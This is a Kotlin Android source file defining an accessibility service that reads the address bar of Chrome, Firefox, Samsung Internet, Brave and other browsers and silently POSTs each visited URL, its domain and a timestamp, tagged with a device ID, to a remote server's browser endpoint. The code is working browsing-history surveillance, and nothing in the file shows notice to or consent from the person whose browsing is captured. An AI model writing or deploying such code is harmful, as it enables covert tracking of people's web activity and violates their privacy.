package com.telemetry.app.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.Executors

class BrowserUrlService : AccessibilityService() {

    companion object {
        const val TAG = "BrowserUrlService"
        const val PREFS_NAME = "telemetry_prefs"
        const val KEY_DEVICE_ID = "device_id"
        const val KEY_SERVER_URL = "server_url"

        // Browser package names to monitor
        val BROWSER_PACKAGES = setOf(
            "com.android.chrome",
            "com.chrome.beta",
            "com.chrome.dev",
            "org.mozilla.firefox",
            "org.mozilla.firefox_beta",
            "com.sec.android.app.sbrowser",
            "com.opera.browser",
            "com.opera.mini.native",
            "com.microsoft.emmx",
            "com.brave.browser",
            "com.duckduckgo.mobile.android",
            "com.UCMobile.intl",
            "com.kiwibrowser.browser"
        )

        // URL patterns to identify URL bars
        val URL_BAR_IDS = listOf(
            "url_bar",
            "url_field",
            "address_bar",
            "addressbarEdit",
            "search_box",
            "omnibox",
            "url",
            "search"
        )
    }

    private val executor = Executors.newSingleThreadExecutor()
    private val handler = Handler(Looper.getMainLooper())

    private var lastUrl: String? = null
    private var lastUrlTimestamp: Long = 0
    private var deviceId: String = ""
    private var serverUrl: String = ""

    // Debounce to avoid duplicate URL reports
    private val urlDebounceMs = 500L

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Accessibility Service connected")

        // Configure the service
        serviceInfo = serviceInfo.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        }

        loadConfig()
    }

    private fun loadConfig() {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        deviceId = prefs.getString(KEY_DEVICE_ID, "") ?: ""
        serverUrl = prefs.getString(KEY_SERVER_URL, "") ?: ""
        Log.d(TAG, "Config loaded - deviceId: $deviceId")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: return

        // Only process browser events
        if (packageName !in BROWSER_PACKAGES) return

        // Debounce rapid events
        val now = System.currentTimeMillis()
        if (now - lastUrlTimestamp < urlDebounceMs) return

        // Try to find the URL
        val rootNode = rootInActiveWindow ?: return
        val url = findUrlInNodeTree(rootNode)
        rootNode.recycle()

        if (url != null && isValidUrl(url) && url != lastUrl) {
            lastUrl = url
            lastUrlTimestamp = now
            handleUrlVisit(url, packageName)
        }
    }

    private fun findUrlInNodeTree(node: AccessibilityNodeInfo?): String? {
        if (node == null) return null

        try {
            // Check if this node might be a URL bar
            val viewId = node.viewIdResourceName?.lowercase() ?: ""
            val className = node.className?.toString() ?: ""

            // Look for EditText or TextView nodes with URL-like IDs
            if (className.contains("EditText") || className.contains("TextView")) {
                // Check if the view ID suggests it's a URL bar
                val isUrlBar = URL_BAR_IDS.any { viewId.contains(it) }

                if (isUrlBar) {
                    val text = node.text?.toString()
                    if (text != null && (text.startsWith("http") || text.contains("."))) {
                        return normalizeUrl(text)
                    }
                }

                // Also check content description
                val contentDesc = node.contentDescription?.toString()
                if (contentDesc != null && isUrlBar) {
                    if (contentDesc.startsWith("http") || contentDesc.contains(".")) {
                        return normalizeUrl(contentDesc)
                    }
                }
            }

            // Recursively search children
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val url = findUrlInNodeTree(child)
                child.recycle()
                if (url != null) return url
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error searching node tree", e)
        }

        return null
    }

    private fun normalizeUrl(url: String): String {
        var normalized = url.trim()

        // Add https:// if no protocol
        if (!normalized.startsWith("http://") && !normalized.startsWith("https://")) {
            normalized = "https://$normalized"
        }

        return normalized
    }

    private fun isValidUrl(url: String): Boolean {
        return try {
            val parsed = URL(url)
            val host = parsed.host

            // Filter out internal/system URLs
            if (host.isNullOrEmpty()) return false
            if (host == "localhost") return false
            if (host.startsWith("192.168.")) return false
            if (host.startsWith("10.")) return false
            if (host == "about:blank") return false

            // Must have a TLD
            host.contains(".")
        } catch (e: Exception) {
            false
        }
    }

    private fun handleUrlVisit(url: String, browserPackage: String) {
        Log.d(TAG, "URL visited: $url in $browserPackage")

        if (serverUrl.isEmpty() || deviceId.isEmpty()) {
            Log.w(TAG, "Cannot send URL - missing config")
            return
        }

        executor.execute {
            try {
                val domain = URL(url).host

                val payload = JSONObject().apply {
                    put("device_id", deviceId)
                    put("url", url)
                    put("domain", domain)
                    put("browser_package", browserPackage)
                    put("timestamp", getIsoTimestamp())
                }

                val apiUrl = URL("$serverUrl/api/browser")
                val conn = apiUrl.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 10000
                conn.readTimeout = 10000

                OutputStreamWriter(conn.outputStream).use { writer ->
                    writer.write(payload.toString())
                }

                val responseCode = conn.responseCode
                if (responseCode == 200 || responseCode == 201) {
                    Log.d(TAG, "URL sent successfully")
                } else {
                    Log.w(TAG, "Failed to send URL: $responseCode")
                }

                conn.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Error sending URL", e)
            }
        }
    }

    private fun getIsoTimestamp(): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
        sdf.timeZone = TimeZone.getTimeZone("UTC")
        return sdf.format(Date())
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility Service interrupted")
    }

    override fun onDestroy() {
        Log.d(TAG, "Accessibility Service destroyed")
        executor.shutdown()
        super.onDestroy()
    }
}
